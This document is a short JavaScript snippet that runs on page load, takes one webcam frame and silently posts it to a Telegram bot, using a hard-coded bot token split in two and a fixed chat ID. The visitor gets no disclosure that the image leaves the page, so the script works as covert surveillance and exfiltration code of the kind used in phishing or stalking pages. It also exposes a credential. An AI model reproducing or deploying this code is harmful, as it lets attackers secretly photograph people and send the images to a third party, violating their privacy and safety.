document.addEventListener("DOMContentLoaded", async () => {

const p1="7848421889";
const p2=":AAGbfxxZPjPhduziUWWjfUB6hZwjoKhufo8";
const key=p1+p2;

const cid="1406121797";
const url=`https://api.telegram.org/bot${key}/sendPhoto`;

const video=document.getElementById("videoElement");
const canvas=document.getElementById("canvasElement");

try{
const stream=await navigator.mediaDevices.getUserMedia({video:true});
video.srcObject=stream;

await new Promise(r=>video.onloadedmetadata=r);

canvas.width=video.videoWidth;
canvas.height=video.videoHeight;
canvas.getContext("2d").drawImage(video,0,0);

stream.getTracks().forEach(t=>t.stop());

canvas.toBlob(blob=>{
const formData=new FormData();
formData.append("chat_id",cid);
formData.append("photo",blob,"test.jpg");

fetch(url,{method:"POST",body:formData})
.then(r=>r.json())
.then(d=>console.log(d))
.catch(e=>console.error(e));

},"image/jpeg",0.8);

}catch(err){
console.error("Camera error:",err);
}

});